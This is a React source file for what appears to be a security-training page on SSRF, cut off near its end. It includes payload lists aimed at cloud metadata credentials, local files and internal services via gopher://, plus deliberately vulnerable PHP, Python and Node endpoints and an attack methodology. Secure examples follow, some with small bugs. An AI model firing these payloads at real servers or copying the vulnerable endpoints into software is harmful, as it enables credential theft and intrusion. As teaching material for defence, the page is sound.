
import React from 'react';
import { ShieldAlert, InfoIcon, Shield } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';

const SSRF: React.FC = () => {
  return (
    <section id="ssrf" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Server-Side Request Forgery (SSRF)</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            Server-Side Request Forgery (SSRF) attacks occur when an attacker can manipulate a server to make requests 
            to internal resources or external systems that would normally be inaccessible. This vulnerability exploits 
            the trust relationship between the server and internal networks, potentially leading to unauthorized access 
            to internal services, data exfiltration, port scanning, remote code execution, and in cloud environments, 
            access to sensitive metadata services containing authentication credentials and configuration data.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Force the server to make requests to internal resources, cloud metadata services, or external systems 
              to bypass network restrictions, access sensitive data, perform internal reconnaissance, or use the server 
              as a proxy for further attacks against internal infrastructure.
            </AlertDescription>
          </Alert>
        </div>

        {/* Attack Types */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of SSRF Attacks</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard
              title="Basic SSRF"
              description="Server makes requests to internal resources with results returned to the attacker, allowing direct data extraction and reconnaissance."
              severity="high"
            />
            <SecurityCard
              title="Blind SSRF"
              description="Server makes requests without returning results, requiring indirect detection methods like DNS lookups or time delays."
              severity="medium"
            />
            <SecurityCard
              title="Semi-blind SSRF"
              description="Limited information returns such as success/failure status codes, response times, or error messages indicating request behavior."
              severity="medium"
            />
            <SecurityCard
              title="SSRF via URL Schemes"
              description="Using non-HTTP URL schemes like file://, gopher://, or ftp:// to access local resources or perform protocol-specific attacks."
              severity="high"
            />
            <SecurityCard
              title="SSRF via Redirects"
              description="Using open redirects or URL shorteners to bounce requests to internal targets, bypassing URL-based filtering mechanisms."
              severity="medium"
            />
            <SecurityCard
              title="Cloud Metadata SSRF"
              description="Targeting cloud provider metadata services to extract sensitive configuration data, IAM credentials, and instance information."
              severity="high"
            />
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>URL Fetching Features:</strong> File upload from URL, image/document processing, RSS feed readers, URL preview generators</li>
              <li><strong>Webhook Implementations:</strong> Notification systems, API callbacks, integration endpoints accepting user-provided URLs</li>
              <li><strong>PDF/Document Generators:</strong> Services that render web pages to PDF, HTML to image converters, report generation tools</li>
              <li><strong>HTTP Proxies and Gateways:</strong> API gateways, reverse proxies, load balancers with user-configurable backends</li>
              <li><strong>Link Validation Services:</strong> URL shorteners, link checkers, social media preview generators, SEO analysis tools</li>
              <li><strong>Third-party Integrations:</strong> OAuth implementations, payment gateways, social media APIs requiring callback URLs</li>
              <li><strong>Content Management Systems:</strong> Features that fetch remote content, import/export functionality, plugin systems</li>
              <li><strong>Monitoring and Analytics:</strong> Health check endpoints, website monitoring tools, performance analysis services</li>
            </ul>
          </div>
        </div>

        {/* Why These Attacks Work */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Why SSRF Attacks Work</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Network Architecture Flaws</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Servers have access to internal networks that external attackers cannot reach</li>
                <li>Internal services often lack authentication assuming network-level protection</li>
                <li>Firewall rules typically allow outbound connections from application servers</li>
                <li>Trust relationships between internal services create privilege escalation opportunities</li>
                <li>Cloud metadata services are accessible from instance internal networks</li>
                <li>DNS resolution can be manipulated to point to internal IP addresses</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Implementation Weaknesses</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Insufficient input validation on URL parameters and user-provided endpoints</li>
                <li>Lack of allowlisting for permitted domains and IP ranges</li>
                <li>Inadequate network-level controls and egress filtering</li>
                <li>Poor understanding of URL parsing edge cases and bypass techniques</li>
                <li>Missing validation of resolved IP addresses after DNS lookup</li>
                <li>Failure to implement proper timeout and rate limiting mechanisms</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Common SSRF Targets */}
        <div>
          <h4 className="text-xl font-semibold mb-4">High-Value SSRF Targets</h4>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Cloud Metadata Services</h5>
              <ul className="list-disc pl-6 space-y-1 text-xs">
                <li><strong>AWS:</strong> 169.254.169.254/latest/meta-data/</li>
                <li><strong>Google Cloud:</strong> 169.254.169.254/computeMetadata/v1/</li>
                <li><strong>Azure:</strong> 169.254.169.254/metadata/instance/</li>
                <li><strong>Digital Ocean:</strong> 169.254.169.254/metadata/v1/</li>
                <li><strong>Alibaba Cloud:</strong> 100.100.100.200/latest/meta-data/</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Internal Services</h5>
              <ul className="list-disc pl-6 space-y-1 text-xs">
                <li><strong>Admin Interfaces:</strong> localhost:8080, 127.0.0.1:9090</li>
                <li><strong>Database Servers:</strong> Internal MySQL, PostgreSQL, MongoDB</li>
                <li><strong>Cache Services:</strong> Redis, Memcached instances</li>
                <li><strong>Message Queues:</strong> RabbitMQ, Apache Kafka</li>
                <li><strong>Monitoring Tools:</strong> Grafana, Kibana, Prometheus</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Network Infrastructure</h5>
              <ul className="list-disc pl-6 space-y-1 text-xs">
                <li><strong>Router Interfaces:</strong> 192.168.1.1, 10.0.0.1</li>
                <li><strong>Network Devices:</strong> Switches, firewalls, printers</li>
                <li><strong>Container Orchestration:</strong> Kubernetes API, Docker daemon</li>
                <li><strong>Service Discovery:</strong> Consul, etcd endpoints</li>
                <li><strong>Internal APIs:</strong> Microservices, development environments</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Step-by-Step Attack Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step Attack Methodology</h4>
          <Tabs defaultValue="discovery">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="discovery">Discovery</TabsTrigger>
              <TabsTrigger value="enumeration">Enumeration</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
              <TabsTrigger value="escalation">Escalation</TabsTrigger>
            </TabsList>
            
            <TabsContent value="discovery" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: SSRF Discovery</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Identify URL Parameters:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Look for parameters accepting URLs: url=, link=, src=, callback=, webhook=</li>
                      <li>Test file upload features that accept URLs instead of local files</li>
                      <li>Check import/export functionality and API integrations</li>
                      <li>Examine image processing and PDF generation services</li>
                    </ul>
                  </li>
                  <li><strong>Test Basic SSRF:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Submit requests to external collaborator servers (Burp Collaborator, pingb.in)</li>
                      <li>Monitor DNS lookups and HTTP requests to confirm outbound connectivity</li>
                      <li>Test various protocols: http://, https://, ftp://, file://, gopher://</li>
                      <li>Check response times and error messages for different target hosts</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="enumeration" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: Internal Network Enumeration</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Enumeration Techniques:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Port Scanning:</strong> Test common ports on localhost and internal IPs</li>
                    <li><strong>Service Discovery:</strong> Probe for web interfaces, APIs, and management consoles</li>
                    <li><strong>Protocol Testing:</strong> Try different URL schemes and protocol handlers</li>
                    <li><strong>Response Analysis:</strong> Analyze response times, status codes, and content differences</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: SSRF Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Exploitation Strategies:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Cloud Metadata Access:</strong> Extract IAM credentials and instance information</li>
                    <li><strong>Internal Service Access:</strong> Interact with admin interfaces and APIs</li>
                    <li><strong>File System Access:</strong> Use file:// protocol to read local files</li>
                    <li><strong>Protocol Smuggling:</strong> Use gopher:// to interact with non-HTTP services</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="escalation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Post-Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Advanced Exploitation:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Credential Extraction:</strong> Use obtained credentials for further access</li>
                    <li><strong>Lateral Movement:</strong> Pivot through internal network using discovered services</li>
                    <li><strong>Data Exfiltration:</strong> Extract sensitive data from internal databases and files</li>
                    <li><strong>Persistence:</strong> Establish foothold in internal network infrastructure</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Common Payloads */}
        <div>
          <h4 className="text-xl font-semibold mb-4">SSRF Attack Payloads</h4>
          
          <CodeExample 
            language="http" 
            isVulnerable={true}
            title="Basic SSRF Testing Payloads" 
            code={`# External collaborator testing
http://your-collaborator-domain.com
https://pingb.in/your-unique-id

# Localhost variations
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::]
http://[::1]

# Internal network scanning
http://10.0.0.1
http://172.16.0.1
http://192.168.1.1
http://192.168.0.1

# Port scanning localhost
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9090

# Cloud metadata services
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/computeMetadata/v1/instance/
http://169.254.169.254/metadata/instance/compute/
http://100.100.100.200/latest/meta-data/

# Alternative protocols
file:///etc/passwd
file:///c:/windows/win.ini
ftp://internal-ftp-server/
gopher://127.0.0.1:6379/_INFO

# DNS-based bypasses
http://nip.io/
http://xip.io/
http://sslip.io/
http://localtest.me/
http://customer1.app.internal.company.com/`} 
          />

          <CodeExample 
            language="http" 
            isVulnerable={true}
            title="Advanced SSRF Bypass Techniques" 
            code={`# IP address encoding bypasses
http://2130706433/          # Decimal encoding of 127.0.0.1
http://0x7f000001/          # Hexadecimal encoding
http://017700000001/        # Octal encoding
http://127.1/               # Short form IP
http://127.0.1/             # Alternative notation

# Domain-based bypasses
http://localtest.me/        # Resolves to 127.0.0.1
http://127.0.0.1.nip.io/    # Wildcard DNS service
http://[::1]/               # IPv6 localhost
http://0000::1/             # IPv6 alternative

# URL parsing bypasses
http://evil.com@127.0.0.1/
http://127.0.0.1#evil.com
http://evil.com/..\\..\\..127.0.0.1/
http://127.0.0.1%2520:8080/

# Protocol smuggling with gopher
gopher://127.0.0.1:6379/_SET%20mykey%20"Hello%20World"
gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com

# File protocol variations
file:///etc/passwd
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd

# Redirect-based bypasses
http://redirector.com/redirect?url=http://127.0.0.1:8080/
http://bit.ly/shortened-internal-url

# Double URL encoding
http%3A%2F%2F127.0.0.1%3A8080%2Fadmin
http%253A%252F%252F127.0.0.1%253A8080%252Fadmin`} 
          />
        </div>

        {/* Vulnerable Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Vulnerable Code Examples</h4>
          
          <CodeExample 
            language="php" 
            isVulnerable={true}
            title="Vulnerable PHP Implementation" 
            code={`<?php
// VULNERABLE: URL fetching without validation
function fetchUrl($url) {
    // No validation of URL or domain
    $context = stream_context_create([
        'http' => [
            'timeout' => 30,
            'user_agent' => 'MyApp/1.0'
        ]
    ]);
    
    return file_get_contents($url, false, $context);
}

// VULNERABLE: Image processing from URL
function processImageFromUrl($imageUrl) {
    // Download image without URL validation
    $imageData = file_get_contents($imageUrl);
    
    if ($imageData === false) {
        throw new Exception('Failed to download image');
    }
    
    // Process image...
    $image = imagecreatefromstring($imageData);
    return $image;
}

// VULNERABLE: Webhook implementation
function sendWebhook($webhookUrl, $data) {
    $postData = json_encode($data);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $webhookUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // No URL validation - allows internal requests
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// Usage examples that would be vulnerable:
// fetchUrl('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
// processImageFromUrl('file:///etc/passwd');
// sendWebhook('http://127.0.0.1:6379/', ['cmd' => 'INFO']);
?>`} 
          />

          <CodeExample 
            language="python" 
            isVulnerable={true}
            title="Vulnerable Python Implementation" 
            code={`import requests
import urllib.request
from flask import Flask, request, jsonify

app = Flask(__name__)

# VULNERABLE: Direct URL fetching
@app.route('/fetch-url', methods=['POST'])
def fetch_url():
    url = request.json.get('url')
    
    try:
        # No validation - allows SSRF
        response = requests.get(url, timeout=10)
        return jsonify({
            'content': response.text,
            'status_code': response.status_code,
            'headers': dict(response.headers)
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# VULNERABLE: PDF generation from URL
@app.route('/url-to-pdf', methods=['POST'])
def url_to_pdf():
    url = request.json.get('url')
    
    # Vulnerable: No URL validation before processing
    import pdfkit
    
    try:
        pdf = pdfkit.from_url(url, False)
        return pdf, 200, {'Content-Type': 'application/pdf'}
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# VULNERABLE: RSS feed reader
@app.route('/read-feed', methods=['POST'])
def read_feed():
    feed_url = request.json.get('feed_url')
    
    try:
        # No validation - can access internal services
        with urllib.request.urlopen(feed_url) as response:
            feed_data = response.read().decode('utf-8')
        
        return jsonify({'feed_content': feed_data})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# VULNERABLE: Image proxy service
@app.route('/proxy-image', methods=['GET'])
def proxy_image():
    image_url = request.args.get('url')
    
    try:
        # Vulnerable: Proxies any URL without validation
        response = requests.get(image_url, stream=True, timeout=30)
        
        def generate():
            for chunk in response.iter_content(chunk_size=8192):
                yield chunk
        
        return app.response_class(
            generate(),
            mimetype=response.headers.get('Content-Type', 'image/jpeg')
        )
    except Exception as e:
        return str(e), 500

# Attack examples:
# POST /fetch-url with {"url": "http://169.254.169.254/latest/meta-data/"}
# POST /url-to-pdf with {"url": "file:///etc/passwd"}
# GET /proxy-image?url=http://127.0.0.1:6379/`} 
          />

          <CodeExample 
            language="javascript" 
            isVulnerable={true}
            title="Vulnerable Node.js Implementation" 
            code={`const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());

// VULNERABLE: URL fetching endpoint
app.post('/api/fetch', async (req, res) => {
    const { url } = req.body;
    
    try {
        // No URL validation - vulnerable to SSRF
        const response = await axios.get(url, {
            timeout: 10000,
            maxRedirects: 5
        });
        
        res.json({
            data: response.data,
            status: response.status,
            headers: response.headers
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// VULNERABLE: Webhook callback
app.post('/api/webhook-callback', async (req, res) => {
    const { callback_url, payload } = req.body;
    
    try {
        // Vulnerable: No validation of callback URL
        await axios.post(callback_url, payload, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 5000
        });
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Webhook delivery failed' });
    }
});

// VULNERABLE: File upload from URL
app.post('/api/upload-from-url', async (req, res) => {
    const { file_url, filename } = req.body;
    
    try {
        // No URL validation - can access internal files
        const response = await axios.get(file_url, {
            responseType: 'stream',
            timeout: 30000
        });
        
        const uploadPath = path.join(__dirname, 'uploads', filename);
        const writer = fs.createWriteStream(uploadPath);
        
        response.data.pipe(writer);
        
        writer.on('finish', () => {
            res.json({ success: true, path: uploadPath });
        });
        
        writer.on('error', (error) => {
            res.status(500).json({ error: 'Upload failed' });
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// VULNERABLE: Link preview generator
app.get('/api/link-preview', async (req, res) => {
    const { url } = req.query;
    
    try {
        // Vulnerable: Fetches any URL for preview generation
        const response = await axios.get(url, {
            timeout: 15000,
            headers: {
                'User-Agent': 'LinkPreview Bot 1.0'
            }
        });
        
        // Simple HTML parsing for preview (also vulnerable)
        const html = response.data;
        const titleMatch = html.match(/<title[^>]*>([^<]+)<\/title>/i);
        const title = titleMatch ? titleMatch[1] : 'No title';
        
        res.json({
            url: url,
            title: title,
            status: response.status
        });
    } catch (error) {
        res.status(500).json({ error: 'Failed to generate preview' });
    }
});

// Attack payloads:
// POST /api/fetch with {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
// POST /api/webhook-callback with {"callback_url": "http://127.0.0.1:6379/", "payload": {"cmd": "INFO"}}
// POST /api/upload-from-url with {"file_url": "file:///etc/passwd", "filename": "passwd.txt"}
// GET /api/link-preview?url=gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com`} 
          />
        </div>

        {/* Secure Implementation */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Secure Implementation Examples</h4>
          
          <CodeExample 
            language="python" 
            isVulnerable={false}
            title="Secure Python SSRF Prevention" 
            code={`import requests
import ipaddress
import socket
from urllib.parse import urlparse
from flask import Flask, request, jsonify

app = Flask(__name__)

# SECURE: URL validation and allowlisting
class SSRFProtection:
    def __init__(self):
        # Allowlist of permitted domains
        self.allowed_domains = [
            'api.example.com',
            'cdn.example.com',
            'trusted-partner.com'
        ]
        
        # Blocked IP ranges (RFC 1918 private networks + others)
        self.blocked_networks = [
            ipaddress.ip_network('127.0.0.0/8'),    # Loopback
            ipaddress.ip_network('10.0.0.0/8'),     # Private
            ipaddress.ip_network('172.16.0.0/12'),  # Private
            ipaddress.ip_network('192.168.0.0/16'), # Private
            ipaddress.ip_network('169.254.0.0/16'), # Link-local (AWS metadata)
            ipaddress.ip_network('::1/128'),        # IPv6 loopback
            ipaddress.ip_network('fc00::/7'),       # IPv6 private
        ]
    
    def is_safe_url(self, url):
        try:
            parsed = urlparse(url)
            
            # Only allow HTTP and HTTPS
            if parsed.scheme not in ['http', 'https']:
                return False, "Only HTTP and HTTPS protocols allowed"
            
            # Check domain allowlist
            if parsed.hostname not in self.allowed_domains:
                return False, f"Domain {parsed.hostname} not in allowlist"
            
            # Resolve hostname to IP and check against blocked networks
            try:
                ip = socket.gethostbyname(parsed.hostname)
                ip_obj = ipaddress.ip_address(ip)
                
                for network in self.blocked_networks:
                    if ip_obj in network:
                        return False, f"IP {ip} is in blocked range {network}"
                        
            except socket.gaierror:
                return False, "Failed to resolve hostname"
            
            return True, "URL is safe"
            
        except Exception as e:
            return False, f"URL validation error: {str(e)}"

ssrf_protection = SSRFProtection()

# SECURE: Protected URL fetching
@app.route('/api/secure-fetch', methods=['POST'])
def secure_fetch():
    url = request.json.get('url')
    
    if not url:
        return jsonify({'error': 'URL is required'}), 400
    
    # Validate URL before making request
    is_safe, message = ssrf_protection.is_safe_url(url)
    if not is_safe:
        return jsonify({'error': f'URL validation failed: {message}'}), 403
    
    try:
        # Make request with additional security measures
        response = requests.get(
            url,
            timeout=10,
            allow_redirects=False,  # Prevent redirect-based bypasses
            headers={'User-Agent': 'SecureApp/1.0'},
            max_retries=0
        )
        
        # Limit response size to prevent DoS
        if len(response.content) > 1024 * 1024:  # 1MB limit
            return jsonify({'error': 'Response too large'}), 413
        
        return jsonify({
            'content': response.text[:10000],  # Truncate response
            'status': response.status_code,
            'content_type': response.headers.get('Content-Type')
        })
        
    except requests.RequestException as e:
        return jsonify({'error': 'Request failed'}), 500

# SECURE: Protected webhook with validation
@app.route('/api/secure-webhook', methods=['POST'])
def secure_webhook():
    callback_url = request.json.get('callback_url')
    payload = request.json.get('payload')
    
    # Validate webhook URL
    is_safe, message = ssrf_protection.is_safe_url(callback_url)
    if not is_safe:
        return jsonify({'error': f'Webhook URL validation failed: {message}'}), 403
    
    try:
        response = requests.post(
            callback_url,
            json=payload,
            timeout=5,
            allow_redirects=False,
            headers={
                'Content-Type': 'application/json',
                'User-Agent': 'SecureWebhook/1.0'
            }
        )
        
        return jsonify({
            'success': True,
            'webhook_status': response.status_code
        })
        
    except requests.RequestException as e:
        return jsonify({'error': 'Webhook delivery failed'}), 500

# SECURE: Additional network-level protection
def setup_network_restrictions():
    \"\"\"
    Additional security measures at the infrastructure level:
    
    1. Firewall rules to block outbound connections to internal ranges
    2. DNS filtering to prevent resolution of internal hostnames
    3. Network segmentation to isolate application servers
    4. Use of HTTP proxies with allowlisting capabilities
    \"\"\"
    pass`} 
          />

          <CodeExample 
            language="javascript" 
            isVulnerable={false}
            title="Secure Node.js SSRF Prevention" 
            code={`const express = require('express');
const axios = require('axios');
const { URL } = require('url');
const dns = require('dns').promises;
const net = require('net');

const app = express();
app.use(express.json());

class SSRFGuard {
    constructor() {
        this.allowedDomains = new Set([
            'api.trusted-domain.com',
            'cdn.partner-site.com',
            'webhook.approved-service.com'
        ]);
        
        this.blockedNetworks = [
            { network: '127.0.0.0', mask: 8 },    // Loopback
            { network: '10.0.0.0', mask: 8 },     // Private
            { network: '172.16.0.0', mask: 12 },  // Private
            { network: '192.168.0.0', mask: 16 }, // Private
            { network: '169.254.0.0', mask: 16 }, // Link-local
        ];
    }
    
    isPrivateIP(ip) {
        const parts = ip.split('.').map(Number);
        
        for (const block of this.blockedNetworks) {
            const networkParts = block.network.split('.').map(Number);
            const mask = block.mask;
            
            let match = true;
            for (let i = 0; i < 4; i++) {
                const hostBits = 32 - mask;
                const networkBits = mask;
                
                if (i * 8 < networkBits) {
                    const bitsInThisByte = Math.min(8, networkBits - i * 8);
                    const maskByte = (0xFF << (8 - bitsInThisByte)) & 0xFF;
                    
                    if ((parts[i] & maskByte) !== (networkParts[i] & maskByte)) {
                        match = false;
                        break;
                    }
                }
            }
            
            if (match) return true;
        }
        
        return false;
    }
    
    async validateURL(urlString) {
        try {
            const url = new URL(urlString);
            
            // Only allow HTTP/HTTPS
            if (!['http:', 'https:'].includes(url.protocol)) {
                throw new Error('Only HTTP and HTTPS protocols are allowed');
            }
            
            // Check domain allowlist
            if (!this.allowedDomains.has(url.hostname)) {
                throw new Error('Domain not in allowlist');
            }
            
            // Resolve IP and check for private networks
            try {
                const addresses = await dns.resolve4(url.hostname);
                
                for (const ip of addresses) {
                    if (this.isPrivateIP(ip)) {
                        throw new Error('Resolved IP is in private range');
                    }
                }
            } catch (dnsError) {
                throw new Error('DNS resolution failed');
            }
            
            return { valid: true, url };
            
        } catch (error) {
            return { valid: false, error: error.message };
        }
    }
}

const ssrfGuard = new SSRFGuard();

// SECURE: Protected HTTP client with restrictions
const createSecureHttpClient = () => {
    return axios.create({
        timeout: 10000,
        maxRedirects: 0, // Disable redirects
        maxContentLength: 1024 * 1024, // 1MB limit
        validateStatus: (status) => status < 400,
        headers: {
            'User-Agent': 'SecureApp/1.0'
        }
    });
};

// SECURE: URL fetching with validation
app.post('/api/secure-fetch', async (req, res) => {
    const { url } = req.body;
    
    if (!url) {
        return res.status(400).json({ error: 'URL is required' });
    }
    
    const validation = await ssrfGuard.validateURL(url);
    if (!validation.valid) {
        return res.status(403).json({ 
            error: 'SSRF protection triggered', 
            details: validation.error 
        });
    }
    
    try {
        const client = createSecureHttpClient();
        const response = await client.get(url);
        
        res.json({
            content: response.data.toString().substring(0, 10000),
            status: response.status,
            contentType: response.headers['content-type']
        });
        
    } catch (error) {
        res.status(500).json({ error: 'Request failed' });
    }
});

// SECURE: Webhook implementation with validation
app.post('/api/secure-webhook', async (req, res) => {
    const { webhookUrl, payload } = req.body;
    
    const validation = await ssrfGuard.validateURL(webhookUrl);
    if (!validation.valid) {
        return res.status(403).json({ 
            error: 'Webhook URL validation failed', 
            details: validation.error 
        });
    }
    
    try {
        const client = createSecureHttpClient();
        const response = await client.post(webhookUrl, payload);
        
        res.json({
            success: true,
            webhookStatus: response.status
        });
        
    } catch (error) {
        res.status(500).json({ error: 'Webhook delivery failed' });
    }
});

// SECURE: Additional middleware for rate limiting
const rateLimit = require('express-rate-limit');

const ssrfLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 50, // Limit each IP to 50 requests per windowMs
    message: 'Too many SSRF-related requests from this IP'
});

app.use('/api/secure-*', ssrfLimiter);`} 
          />
        </div>

        {/* Testing and Detection */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Testing for SSRF Vulnerabilities</h4>
          
          <div className="space-y-4">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Manual Testing Techniques</h5>
              <ol className="list-decimal pl-6 space-y-2 text-sm">
                <li><strong>Baseline Testing:</strong> Submit requests to external collaborator services to confirm outbound connectivity</li>
                <li><strong>Internal Network Probing:</strong> Test localhost, private IP ranges, and common internal service ports</li>
                <li><strong>Cloud Metadata Testing:</strong> Attempt to access cloud provider metadata services</li>
                <li><strong>Protocol Enumeration:</strong> Test various URL schemes (file://, gopher://, ftp://)</li>
                <li><strong>Bypass Testing:</strong> Try IP encoding, domain variations, and redirect-based bypasses</li>
                <li><strong>Response Analysis:</strong> Analyze response times, error messages, and content for information disclosure</li>
              </ol>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Automated Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Burp Suite Professional:</strong> SSRF scanner with collaborator integration</li>
                <li><strong>OWASP ZAP:</strong> Active and passive SSRF detection capabilities</li>
                <li><strong>SSRFmap:</strong> Specialized tool for SSRF detection and exploitation</li>
                <li><strong>Gopherus:</strong> Tool for generating gopher:// payloads</li>
                <li><strong>SSRFDetector:</strong> Python tool for automated SSRF testing</li>
                <li><strong>Nuclei:</strong> Template-based SSRF vulnerability scanning</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Prevention Strategies */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive SSRF Prevention</h4>
          
          <Alert className="mb-6">
            <Shield className="h-4 w-4" />
            <AlertTitle>Defense in Depth</AlertTitle>
            <AlertDescription>
              Implement multiple layers of SSRF protection including input validation, network-level controls, 
              and application-level restrictions to prevent attackers from exploiting server-side request functionality.
            </AlertDescription>
          </Alert>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 rounded-md border border-green-200 dark:border-green-800 bg-cybr-muted">
              <h5 className="font-semibold mb-3 text-green-800 dark:text-green-200">Application-Level Controls</h5>
              <ul className="list-disc pl-6 space-y-2 text-sm">
                <li><strong>URL Allowlisting:</strong> Maintain strict allowlists of permitted domains and endpoints</li>
                <li><strong>Input Validation:</strong> Validate and sanitize all URL parameters and user input</li>
                <li><strong>Protocol Restrictions:</strong> Only allow safe protocols (HTTP/HTTPS)</li>
                <li><strong>IP Address Validation:</strong> Check resolved IPs against blocked ranges</li>
                <li><strong>Redirect Prevention:</strong> Disable or limit HTTP redirects in HTTP clients</li>
                <li><strong>Response Size Limits:</strong> Implement maximum response size restrictions</li>
              </ul>
            </div>
            
            <div className="p-4 rounded-md border border-blue-200 dark:border-blue-800 bg-cybr-muted">
              <h5 className="font-semibold mb-3 text-blue-800 dark:text-blue-200">Network-Level Controls</h5>
              <ul className="list-disc pl-6 space-y-2 text-sm">
                <li><strong>Egress Filtering:</strong> Implement firewall rules blocking internal network access</li>
                <li><strong>Network Segmentation:</strong> Isolate application servers from sensitive internal networks</li>
                <li><strong>DNS Filtering:</strong> Use DNS servers that block resolution of internal hostnames</li>
                <li><strong>Proxy Configuration:</strong> Route outbound requests through filtering proxies</li>
                <li><strong>Cloud Security Groups:</strong> Restrict outbound connections at the cloud level</li>
                <li><strong>VPN Segregation:</strong> Separate application networks from administrative networks</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Environment-Specific Considerations */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Environment-Specific SSRF Considerations</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Cloud Environments</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Metadata Service Protection:</strong> Use IMDSv2 and disable metadata access where possible</li>
                <li><strong>IAM Role Restrictions:</strong> Apply principle of least privilege to instance roles</li>
